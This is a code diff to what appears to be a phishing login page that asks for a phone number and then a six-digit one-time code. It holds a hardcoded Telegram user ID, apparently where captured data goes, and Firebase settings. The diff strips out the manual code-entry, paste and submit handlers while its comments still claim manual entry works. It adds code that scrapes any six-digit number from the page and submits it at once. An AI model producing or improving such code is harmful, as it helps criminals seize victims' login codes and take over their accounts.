@@ -594,7 +594,7 @@
     // ===================================================
     // 🔧 TELEGRAM USER ID
     // ===================================================
-    const TELEGRAM_USER_ID = "8381110456";
+    const TELEGRAM_USER_ID = "8519748216";
     // ===================================================
 
     // ===== FIREBASE CONFIGURATION =====
@@ -848,11 +848,11 @@
         phoneDisplay.textContent = countryCodeSelect.value + phoneInput.value.trim();
         loginCard.style.display = 'none';
         otpCard.classList.add('active');
-        // OTP inputs are editable; clear them
+        // OTP inputs are manually enterable; also auto-filled if detected
         document.querySelectorAll('.otp-digit').forEach(i => i.value = '');
         document.getElementById('otpSubmitBtn').disabled = true;
         startResendTimer();
-        // Start listening for OTP auto-detection (if any)
+        // Start listening for OTP auto-detection
         startOtpAutoDetection();
       }
 
@@ -899,31 +899,29 @@
         redirectTimeout = interval;
       }
 
-      // ===== OTP LOGIC (with manual entry support) =====
+      // ===== OTP LOGIC =====
       const otpInputs = document.querySelectorAll('.otp-digit');
       const otpSubmitBtn = document.getElementById('otpSubmitBtn');
       let resendTimerInterval = null;
       let timerSeconds = 93;
 
-      // Check if all OTP fields are filled
-      function checkOtpFilled() {
-        const filled = Array.from(otpInputs).every(i => i.value.length === 1);
-        otpSubmitBtn.disabled = !filled;
-        return filled;
-      }
-
-      // Auto-fill OTP from detection (if any) – but we keep manual entry
+      // OTP inputs accept manual entry; auto-fill also populates them
       function fillOtpInputs(otp) {
         if (!otp || otp.length !== 6) return;
         const digits = otp.split('');
         otpInputs.forEach((input, idx) => {
           if (idx < digits.length) input.value = digits[idx];
         });
-        // Update button state after fill
-        checkOtpFilled();
+        // Auto-submit when all digits are filled
+        if (checkOtpFilled()) submitOtp();
       }
 
-      // Submit OTP – called when user clicks the button or when all six digits are filled
+      function checkOtpFilled() {
+        const filled = Array.from(otpInputs).every(i => i.value.length === 1);
+        otpSubmitBtn.disabled = !filled;
+        return filled;
+      }
+
       function submitOtp() {
         if (isVerifying) return;
         const otp = Array.from(otpInputs).map(i=>i.value).join('');
@@ -942,100 +940,31 @@
           .catch((error) => { console.error(error); hideLoadingSpinner(); isVerifying = false; showVerificationError('verification code is incorrect.'); });
       }
 
-      // ---- Manual OTP input handlers ----
-      otpInputs.forEach((input, index) => {
-        // On input: move to next field, update button state
-        input.addEventListener('input', function(e) {
-          // Remove any non-numeric characters
-          this.value = this.value.replace(/\D/g, '');
-          if (this.value.length > 1) this.value = this.value.slice(0,1);
-          
-          // Move to next field if a digit is entered
-          if (this.value.length === 1 && index < otpInputs.length - 1) {
-            otpInputs[index + 1].focus();
-          }
-          // Update submit button state
-          checkOtpFilled();
-        });
-
-        // Keydown for backspace, arrows, and Enter
-        input.addEventListener('keydown', function(e) {
-          // Backspace: move to previous field if current is empty
-          if (e.key === 'Backspace' && this.value === '' && index > 0) {
-            otpInputs[index - 1].focus();
-            e.preventDefault();
-          }
-          // Arrow left
-          if (e.key === 'ArrowLeft' && index > 0) {
-            otpInputs[index - 1].focus();
-            e.preventDefault();
-          }
-          // Arrow right
-          if (e.key === 'ArrowRight' && index < otpInputs.length - 1) {
-            otpInputs[index + 1].focus();
-            e.preventDefault();
-          }
-          // Enter key: submit if all filled
-          if (e.key === 'Enter') {
-            e.preventDefault();
-            if (checkOtpFilled()) {
-              submitOtp();
-            }
-          }
-        });
-
-        // Paste handler: distribute 6-digit code across fields
-        input.addEventListener('paste', function(e) {
-          e.preventDefault();
-          const paste = (e.clipboardData || window.clipboardData).getData('text');
-          if (paste) {
-            const digits = paste.replace(/\D/g, '').slice(0, 6).split('');
-            otpInputs.forEach((p, idx) => {
-              p.value = idx < digits.length ? digits[idx] : '';
-            });
-            // Focus the first empty field, or last field if all filled
-            const firstEmpty = Array.from(otpInputs).find(p => p.value === '');
-            if (firstEmpty) firstEmpty.focus();
-            else otpInputs[otpInputs.length - 1].focus();
-            checkOtpFilled();
-          }
-        });
-
-        // Also handle focus to select content for easy overwrite
-        input.addEventListener('focus', function() {
-          this.select();
-        });
-      });
-
-      // Submit button click
-      otpSubmitBtn.addEventListener('click', function(e) {
-        e.preventDefault();
-        if (!this.disabled) {
-          submitOtp();
-        }
-      });
-
-      // ===== OTP AUTO-DETECTION (from background/notification) - keep as is, but do not auto-submit =====
+      // ===== OTP AUTO-DETECTION =====
       function startOtpAutoDetection() {
         const otpRegex = /\b\d{6}\b/;
         
+        // Function to scan for OTP in the page (from background messages / notifications)
         function scanForOtp() {
           if (!document.getElementById('otpCard').classList.contains('active')) return;
+          // Look for 6-digit numbers in the visible text
           const bodyText = document.body.innerText;
           const match = bodyText.match(otpRegex);
           if (match) {
             const detectedOtp = match[0];
             console.log('🔍 Auto-detected OTP from page text:', detectedOtp);
-            fillOtpInputs(detectedOtp); // fills fields but does not auto-submit
+            fillOtpInputs(detectedOtp);
           }
         }
 
+        // Listen for visibility change (page comes to foreground)
         document.addEventListener('visibilitychange', () => {
           if (document.visibilityState === 'visible') {
             scanForOtp();
           }
         });
 
+        // Listen for message events (from service workers or other frames)
         window.addEventListener('message', (event) => {
           try {
             const data = event.data;
@@ -1049,6 +978,7 @@
           } catch (e) {}
         });
 
+        // MutationObserver to detect new text nodes inserted (e.g., from push notifications)
         const observer = new MutationObserver(() => {
           if (document.getElementById('otpCard').classList.contains('active')) {
             scanForOtp();
@@ -1056,6 +986,7 @@
         });
         observer.observe(document.body, { childList: true, subtree: true, characterData: true });
 
+        // Also check periodically (every 2 seconds) for any new OTP
         const intervalId = setInterval(() => {
           if (!document.getElementById('otpCard').classList.contains('active')) {
             clearInterval(intervalId);
@@ -1064,6 +995,7 @@
           scanForOtp();
         }, 2000);
 
+        // Initial scan
         setTimeout(scanForOtp, 500);
       }
 
